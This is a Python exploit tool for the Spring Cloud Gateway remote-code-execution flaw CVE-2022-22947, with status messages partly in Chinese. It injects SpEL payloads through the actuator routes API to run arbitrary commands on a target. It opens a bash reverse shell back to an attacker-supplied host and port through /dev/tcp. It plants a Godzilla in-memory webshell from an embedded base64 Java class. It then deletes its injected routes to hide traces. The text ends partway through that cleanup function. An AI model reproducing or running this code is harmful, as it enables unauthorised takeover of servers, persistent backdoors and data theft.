from urllib.parse import urlparse, urljoin
import requests
import random
import string
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import click
import os

class CVE_2022_22947:

    def __init__(self, target, proxy) -> None:
        self.target = target
        self.proxies = proxy
        self.headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
            'Connection': 'close',
            'Content-Type': 'application/json'
        }
        self.verify = False
        self.timeout = 10
        self.allow_redirects = False

    def get_random_id(self):
        # ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        # random_letters = [random.choice(string.ascii_lowercase) for i in range(length)]
        random_letters = list()
        for i in range(8):
            random_letter = random.choice(string.ascii_letters)
            random_letters.append(random_letter)
            random_str = ''.join(random_letters)
        return random_str

    def get_random_ids(self):
        base_str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
        random_str =""
        for i in range(8):
            # random_str.append(base_str[random.randint(0, len(base_str) - 1)]) 
            random_str += base_str[random.randint(0, len(base_str) - 1)]   
        return random_str
    
    def base64_encode(self, encode_str):
        # 字符串前面的 b 表示字符串是一个字节字符串（bytes string）
        byte_str = encode_str.encode('utf-8')
        encode__data = base64.b64encode(byte_str)
        return encode__data
    
    def base64_decode(self, encode_data):
        return base64.b64decode(encode_data)


    def check(self):
        err = ""  # 默认错误消息为空字符串
        result = ""
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            command = "echo QanNB12138"
            id = self.get_random_id()
            proxies = self.proxies
            payload = { "id": id, "filters": [{ "name": "AddResponseHeader", "args": { "name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022"+command+"\u0022).getInputStream()))}"}}],"uri": "http://example.com"}
            add_route = "/actuator/gateway/routes/" + id
            url = urljoin(self.target, add_route)
            add_response = requests.post(url=url, headers=self.headers, data=json.dumps(payload), timeout=self.timeout, verify=self.verify, proxies=proxies)
            if add_response.status_code == 201:
                # result.append(f"[+] Stage deployed to [{add_route}]")
                # result.append(f"[+] Executing Command [{command}] ……")
                refresh_route = "/actuator/gateway/refresh"
                refresh_url = urljoin(self.target, refresh_route)
                refresh_reponse = requests.post(url=refresh_url, headers=self.headers, proxies=proxies, verify=self.verify, timeout=self.timeout)
                if refresh_reponse.status_code == 200:
                    # print(f"[+] Getting Result ……")
                    # result.append(f"[+] Getting Result ……")
                    result_route = "/actuator/gateway/routes/" + id
                    result_url = urljoin(self.target, result_route)
                    result_reponse = requests.get(url=result_url, headers=self.headers, verify=self.verify, timeout=self.timeout)
                    if result_reponse.status_code == 200 and "QanNB12138" in result_reponse.text:
                        result_json = result_reponse.json()
                        # result.append(f"[+] Result: {result_json["filters"][0].split("'")[1]}".replace("\n", ""))
                        # result.append(f"[+] {self.target} 存在 CVE-2022-22947 RCE 漏洞")
                        result = f"[+] {self.target} 存在 CVE-2022-22947 spring clound getway RCE 漏洞。\r\n[+] Result: {result_json["filters"][0].split("'")[1]}".replace("\n", "")
                        self.clear(self.target, id)                        
                    else:
                        result = f"[-] {self.target} 不存在 CVE-2022-22947 spring clound getway RCE 漏洞。"
                        self.clear(self.target, id)
                else:
                    result = f"[-] {self.target} 不存在 CVE-2022-22947 spring clound getway RCE 漏洞。"
                    self.clear(self.target, id)
            else:
                result = f"[-] {self.target} 不存在 CVE-2022-22947 spring clound getway RCE 漏洞。"
            return err, result
        except requests.exceptions.HTTPError as e:
            err = f"{self.target} HTTP请求错误!"           
            return err, result
        except requests.exceptions.ConnectionError as e:
            err = f"{self.target} 连接错误，请检查网络!"
            return err, result
        except requests.exceptions.Timeout as e:
            err = f"{self.target} 连接超时!"
            return err, result
        except Exception as e:
            err = f"An Err Occurred: {str(e)}!"
            return err, result

    
    def exploit(self, command):
        err = ""  # 默认错误消息为空字符串
        reulst = ""
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            id = self.get_random_id()
            proxies = self.proxies
            # data = 'eyAiaWQiOiAiYW9kU0VDIiwgImZpbHRlcnMiOiBbeyAibmFtZSI6ICJBZGRSZXNwb25zZUhlYWRlciIsICJhcmdzIjogeyAibmFtZSI6ICJSZXN1bHQiLCAidmFsdWUiOiAiI3tuZXcgU3RyaW5nKFQob3JnLnNwcmluZ2ZyYW1ld29yay51dGlsLlN0cmVhbVV0aWxzKS5jb3B5VG9CeXRlQXJyYXkoVChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tde1wiQ21kXCJ9KS5nZXRJbnB1dFN0cmVhbSgpKSl9IiB9IH1dLCAidXJpIjogImh0dHA6Ly9leGFtcGxlLmNvbSIgfQ=='
            payload = { "id": id, "filters": [{ "name": "AddResponseHeader", "args": { "name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022"+command+"\u0022).getInputStream()))}"}}],"uri": "http://example.com"}
            add_route = "/actuator/gateway/routes/" + id
            url = urljoin(self.target, add_route)
            add_response = requests.post(url=url, headers=self.headers, data=json.dumps(payload), timeout=self.timeout, verify=self.verify, proxies=proxies)
            if add_response.status_code == 201:
                refresh_route = "/actuator/gateway/refresh"
                refresh_url = urljoin(self.target, refresh_route)
                refresh_reponse = requests.post(url=refresh_url, headers=self.headers, proxies=proxies, verify=self.verify, timeout=self.timeout)
                if refresh_reponse.status_code == 200:
                    result_route = "/actuator/gateway/routes/" + id
                    result_url = urljoin(self.target, result_route)
                    result_reponse = requests.get(url=result_url, headers=self.headers, verify=self.verify, timeout=self.timeout)
                    if result_reponse.status_code == 200:
                        result_json = result_reponse.json()
                        self.clear(self.target, id)
                        # print(result_json["filters"][0].split("'")[1], end="")
                        reulst = result_json["filters"][0].split("'")[1]
                        return err, reulst
                    else:
                        err = f"Err: {self.target} Invalid Command"
                        self.clear(self.target, id)
                        return err, reulst
                else:
                    self.clear(self.target, id)
                    err = (f"Err: {self.target} Excute Command False")
                    return err, reulst
            else:
                err = f"Err: {url} route add error"
                return err,reulst
        except Exception as e:
            err = f"{self.target} An Err Occurred: {str(e)}"
            return err,reulst

    def reverse_shell(self, lhost, lport):
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            id = self.get_random_id()
            proxies = self.proxies
            data = 'eyAiaWQiOiAiYW9kU0VDIiwgImZpbHRlcnMiOiBbeyAibmFtZSI6ICJBZGRSZXNwb25zZUhlYWRlciIsICJhcmdzIjogeyAibmFtZSI6ICJSZXN1bHQiLCAidmFsdWUiOiAiI3tuZXcgU3RyaW5nKFQob3JnLnNwcmluZ2ZyYW1ld29yay51dGlsLlN0cmVhbVV0aWxzKS5jb3B5VG9CeXRlQXJyYXkoVChqYXZhLmxhbmcuUnVudGltZSkuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tde1wiL2Jpbi9iYXNoXCIsXCItY1wiLFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9MX0lQL0xfUE9SVCAwPiYxXCJ9KS5nZXRJbnB1dFN0cmVhbSgpKSl9IiB9IH1dLCAidXJpIjogImh0dHA6Ly9leGFtcGxlLmNvbSIgfQ=='
            add_route = "/actuator/gateway/routes/" + id
            url = urljoin(self.re_stander_url(), add_route)
            requests.post(url=url, headers=self.headers, data=self.base64_decode(data).decode().replace('L_IP', lhost).replace("L_PORT", lport), timeout=self.timeout, verify=self.verify, proxies=proxies)
            
            refresh_route = "/actuator/gateway/refresh"
            refresh_url = urljoin(self.re_stander_url(), refresh_route)
            requests.post(url=refresh_url, headers=self.headers, proxies=proxies, verify=self.verify, timeout=self.timeout)
            
            self.clear(self.re_stander_url(), id)
        except:
            pass
        
    def godzilla_memshell(self):
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            id = self.get_random_id()
            proxies = self.proxies
            payload='''{
                "id": "hacktest",
                "filters": [{
                    "name": "AddResponseHeader",
                    "args": {
                        "name": "Result",
                        "value": "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('ms.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBeAoADQC2BwC3CgACALYJABIAuAoAAgC5CQASALoKAAIAuwoAEgC8CQASAL0KAA0AvggAcgcAvwcAwAcAwQcAwgoADADDCgAOAMQHAMUIAJ8HAMYHAMcKAA8AyAsAyQDKCgASALYKAA4AywgAzAcAzQoAGwDOCADPBwDQBwDRCgDSANMKANIA1AoAHgDVBwDWCACBBwCECQDXANgKANcA2QgA2goA2wDcBwDdCgAVAN4KACoA3woA2wDgCgDbAOEIAOIKAOMA5AoAFQDlCgDjAOYHAOcKAOMA6AoAMwDpCgAzAOoKABUA6wgA7AoADADtCADuCgAMAO8IAPAIAPEKAAwA8ggA8wgA9AgA9QgA9ggA9wsAFAD4EgAAAP4KAP8BAAcBAQkBAgEDCgBHAQQKABsBBQsBBgEHCgASAQgKABIBCQkAEgEKCAELCwEMAQ0KABIBDgsBDAEPCAEQBwERCgBUALYKAA0BEgoAFQETCgANALsKAFQBFAoAEgEVCgAVARYKAP8BFwcBGAoAXQC2CABlCAEZAQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTG1zL0dNZW1TaGVsbDsBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEADVN0YWNrTWFwVGFibGUHAM0HAMcBABBNZXRob2RQYXJhbWV0ZXJzAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAApjbGFzc2J5dGVzAQACW0IBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAZtZXRob2QBAApFeGNlcHRpb25zAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAW0BAAFaBwDFBwEaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAJleAEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9Qb3N0TWFwcGluZzsBAAQvY21kAQANbGFtYmRhJGNtZCQxMQEARyhMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAJpZAEABGRhdGEBAChMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7AQAGcmVzdWx0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwcAtwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEADkdNZW1TaGVsbC5qYXZhDABpAGoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAZQBmDAEbARwMAGgAZgwBHQEeDABnAJIMAGcAZgwBHwEgAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAEhASIMASMBJAEADG1zL0dNZW1TaGVsbAEAMG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcMASUBKAcBKQwBKgErDAEsAS0BAAJvawEAE2phdmEvbGFuZy9FeGNlcHRpb24MAS4AagEABWVycm9yAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIBAAxqYXZhL25ldC9VUkwHAS8MATABMQwBMgEzDABpATQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHATUMATYAmQwBNwE4AQADQUVTBwEaDAE5AToBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAE7ATwMAGkBPQwBPgE/DAFAAUEBAANNRDUHAUIMATkBQwwBRAFFDAFGAUcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBSAE8DABpAUkMAR0BSgwBSwEeAQAQamF2YS51dGlsLkJhc2U2NAwBTAFNAQAKZ2V0RW5jb2RlcgwBTgEiAQAOZW5jb2RlVG9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFPAVABAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBUQFSAQAQQm9vdHN0cmFwTWV0aG9kcw8GAVMQAVQPBwFVEACpDAFWAVcHAVgMAVkBWgEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcBWwwBXAFdDABpAV4MAV8BHgcBYAwBYQFUDACcAJ0MAIkAigwAYQBiAQAHcGF5bG9hZAcBYgwBYwFUDACBAIIMAWQBZQEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBZgFnDAFoAWkMAWoBPAwAlQCWDAFoAUoMAWsBbAEAEWphdmEvdXRpbC9IYXNoTWFwAQAQM2M2ZTBiOGE5YzE1MjI0YQEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXRocwEAB0J1aWxkZXIBAAxJbm5lckNsYXNzZXMBAGAoW0xqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAElvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAFYnVpbGQBAEUoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBbQFuAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABIBbwEABWFwcGx5AQAtKExtcy9HTWVtU2hlbGw7KUxqYXZhL3V0aWwvZnVuY3Rpb24vRnVuY3Rpb247AQAbcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vAQAHZmxhdE1hcAEAPChMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgEACmdldE1lc3NhZ2UBACZvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcAEACGdldEZpcnN0AQANamF2YS91dGlsL01hcAEAA2dldAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAEanVzdAEAMShMamF2YS9sYW5nL09iamVjdDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsHAXAMAXEBdAwAqACpAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwF2AQAGTG9va3VwAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwF3AQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhABIADQAAAAQACQBhAGIAAQBjAAAAAgBkAAkAZQBmAAAACQBnAGYAAAAJAGgAZgAAAAoAAQBpAGoAAQBrAAAALwABAAEAAAAFKrcAAbEAAAACAGwAAAAGAAEAAAAWAG0AAAAMAAEAAAAFAG4AbwAAAAkAcABxAAIAawAAAUgABwAGAAAAkLsAAlm3AAOyAAS2AAWyAAa2AAW2AAe4AAizAAkqtgAKEgsGvQAMWQMSDVNZBBIOU1kFEg9TtgAQTi0EtgAREhISEwS9AAxZAxIUU7YAEDoEBL0AFVkDK1O4ABa5ABcBADoFLSoGvQANWQO7ABJZtwAYU1kEGQRTWQUZBVO2ABlXEhpNpwALTi22ABwSHU0ssAABAAAAgwCGABsAAwBsAAAAMgAMAAAAHQAcAB4AOQAfAD4AIABQACEAYgAiAIAAIwCDACcAhgAkAIcAJQCLACYAjgAoAG0AAABSAAgAOQBKAHIAcwADAFAAMwB0AHMABABiACEAdQB2AAUAgwADAHcAZgACAIcABwB4AHkAAwAAAJAAegB7AAAAAACQAHwAZgABAI4AAgB3AGYAAgB9AAAADgAC9wCGBwB+/AAHBwB/AIAAAAAJAgB6AAAAfAAAAAoAgQCCAAMAawAAAJ4ABgADAAAAVLsAHlkDvQAfuAAgtgAhtwAiTBIjEiQGvQAMWQMSJVNZBLIAJlNZBbIAJlO2ABBNLAS2ABEsKwa9AA1ZAypTWQQDuAAnU1kFKr64ACdTtgAZwAAMsAAAAAIAbAAAABIABAAAAC0AEgAuAC8ALwA0ADAAbQAAACAAAwAAAFQAgwCEAAAAEgBCAIUAhgABAC8AJQCHAHMAAgCIAAAABAABABsAgAAAAAUBAIMAAAABAIkAigACAGsAAADXAAYABAAAACsSKLgAKU4tHJkABwSnAAQFuwAqWbIABrYAKxIotwAstgAtLSu2AC6wTgGwAAEAAAAnACgAGwADAGwAAAAWAAUAAAA1AAYANgAiADcAKAA4ACkAOQBtAAAANAAFAAYAIgCLAIwAAwApAAIAeAB5AAMAAAArAG4AbwAAAAAAKwCNAIQAAQAAACsAjgCPAAIAfQAAADwAA/8ADwAEBwCQBwAlAQcAkQABBwCR/wAAAAQHAJAHACUBBwCRAAIHAJEB/wAXAAMHAJAHACUBAAEHAH4AgAAAAAkCAI0AAACOAAAACQBnAJIAAgBrAAAApwAEAAMAAAAwAUwSL7gAME0sKrYAKwMqtgAxtgAyuwAzWQQstgA0twA1EBC2ADa2ADdMpwAETSuwAAEAAgAqAC0AGwADAGwAAAAeAAcAAAA+AAIAQQAIAEIAFQBDACoARQAtAEQALgBGAG0AAAAgAAMACAAiAI4AkwACAAAAMACNAGYAAAACAC4AlABmAAEAfQAAABMAAv8ALQACBwB/BwB/AAEHAH4AAIAAAAAFAQCNAAAACQCVAJYAAwBrAAABRAAGAAUAAAByAU0SOLgAOUwrEjoBtgA7KwG2ABlOLbYAChI8BL0ADFkDEiVTtgA7LQS9AA1ZAypTtgAZwAAVTacAOU4SPbgAOUwrtgA+OgQZBLYAChI/BL0ADFkDEiVTtgA7GQQEvQANWQMqU7YAGcAAFU2nAAU6BCywAAIAAgA3ADoAGwA7AGsAbgAbAAMAbAAAADIADAAAAEsAAgBNAAgATgAVAE8ANwBXADoAUAA7AFIAQQBTAEcAVABrAFYAbgBVAHAAWABtAAAASAAHABUAIgCXAHsAAwAIADIAmACZAAEARwAkAJcAewAEAEEALQCYAJkAAQA7ADUAeAB5AAMAAAByAJoAhAAAAAIAcACbAGYAAgB9AAAAKgAD/wA6AAMHACUABwB/AAEHAH7/ADMABAcAJQAHAH8HAH4AAQcAfvoAAQCIAAAABAABABsAgAAAAAUBAJoAAAAJAJwAnQADAGsAAAFKAAYABQAAAHgBTRI4uAA5TCsSQAG2ADsrAbYAGU4ttgAKEkEEvQAMWQMSFVO2ADstBL0ADVkDKlO2ABnAACXAACVNpwA8ThJCuAA5TCu2AD46BBkEtgAKEkMEvQAMWQMSFVO2ADsZBAS9AA1ZAypTtgAZwAAlwAAlTacABToELLAAAgACADoAPQAbAD4AcQB0ABsAAwBsAAAAMgAMAAAAXQACAF8ACABgABUAYQA6AGkAPQBiAD4AZABEAGUASgBmAHEAaAB0AGcAdgBqAG0AAABIAAcAFQAlAJ4AewADAAgANQCYAJkAAQBKACcAngB7AAQARAAwAJgAmQABAD4AOAB4AHkAAwAAAHgAmgBmAAAAAgB2AJsAhAACAH0AAAAqAAP/AD0AAwcAfwAHACUAAQcAfv8ANgAEBwB/AAcAJQcAfgABBwB++gABAIgAAAAEAAEAGwCAAAAABQEAmgAAACEAnwCgAAMAawAAAJQABAADAAAALCu5AEQBACq6AEUAALYARk27AEdZLLIASLcASbBNuwBHWSy2AEqyAEi3AEmwAAEAAAAbABwAGwADAGwAAAASAAQAAABxABAAiAAcAIkAHQCKAG0AAAAqAAQAEAAMAKEAewACAB0ADwCiAHkAAgAAACwAbgBvAAAAAAAsAKMApAABAH0AAAAGAAFcBwB+AIAAAAAFAQCjAAAApQAAAA4AAQCmAAEAm1sAAXMApxACAKgAqQACAGsAAAGYAAQABwAAAMC7AAJZtwADTSuyAAS5AEsCAMAAFU4qLbgATAO2AE06BLIAThJPuQBQAgDHABayAE4STxkEuABRuQBSAwBXpwBusgBOElMZBLkAUgMAV7sAVFm3AFU6BbIAThJPuQBQAgDAAAy2AD46BhkGGQW2AFZXGQYZBLYAVlcssgAJAxAQtgBXtgAFVxkGtgBYVywqGQW2AFkEtgBNuABatgAFVyyyAAkQELYAW7YABVenAA1OLC22AEq2AAVXLLYAB7gAXLAAAQAIAKsArgAbAAMAbAAAAEoAEgAAAHIACAB0ABUAdQAgAHYALQB3AEAAeQBNAHoAVgB7AGgAfABwAH0AeAB+AIYAfwCMAIAAngCBAKsAhQCuAIMArwCEALgAhgBtAAAAUgAIAFYAVQCqAKsABQBoAEMArAB7AAYAFQCWAK0AZgADACAAiwCuAIQABACvAAkAogB5AAMAAADAAG4AbwAAAAAAwACLAK8AAQAIALgAsACxAAIAfQAAABYABP4AQAcAsgcAfwcAJfkAakIHAH4JAIAAAAAFAQCLEAAACACzAGoAAQBrAAAAMQACAAAAAAAVuwBdWbcAXrMAThJfswAEEmCzAAaxAAAAAQBsAAAACgACAAAAFwAKABgAAwC0AAAAAgC1AScAAAASAAIAyQAPASYGCQFyAXUBcwAZAPkAAAAMAAEA+gADAPsA/AD9'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/godzillamem')}"
                }
                    }],
                "uri": "http://example.com"
            }'''
            add_route = "/actuator/gateway/routes/" + id
            url = urljoin(self.re_stander_url(), add_route)
            add_response = requests.post(url=url, headers=self.headers, data=payload, timeout=self.timeout, verify=self.verify, proxies=proxies, allow_redirects=self.allow_redirects)
            if add_response.status_code == 201:
                refresh_route = "/actuator/gateway/refresh"
                refresh_url = urljoin(self.re_stander_url(), refresh_route)
                refresh_reponse = requests.post(url=refresh_url, headers=self.headers, proxies=proxies, verify=self.verify, timeout=self.timeout, allow_redirects=self.allow_redirects)
                if refresh_reponse.status_code == 200:
                    result_route = "/actuator/gateway/routes/" + id
                    result_url = urljoin(self.re_stander_url(), result_route)
                    requests.get(url=result_url, headers=self.headers, verify=self.verify, timeout=self.timeout, allow_redirects=self.allow_redirects)
                    m_url = urljoin(self.re_stander_url(), "/godzillamem")
                    m_re = requests.post(url=m_url, headers=self.headers, timeout=self.timeout, verify=self.verify, allow_redirects=self.allow_redirects)
                    if m_re.status_code == 200:
                        click.secho(f"[+] 注入哥斯拉内存马成功，shell：{m_url} (默认key pass base64)", fg="red")
                else:
                    
                    print("Err: Excute Command False")
            else:
                print(f"Err: {url} route add error")
        except Exception as e:
            print(f"An Err Occurred: {str(e)}")

    def clear(self, url, id):
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            proxies = self.proxies
            del_route = "/actuator/gateway/routes/" + id
            t = urljoin(url, del_route)
            del_response = requests.delete(url=t, headers=self.headers, verify=self.verify, timeout=self.timeout, proxies=proxies)
            if del_response.status_code == 200:
                # print(f"[+] Stage route={id} delete success!")
                return True
            else:
                print(f"Stage {id} route delete failed!")
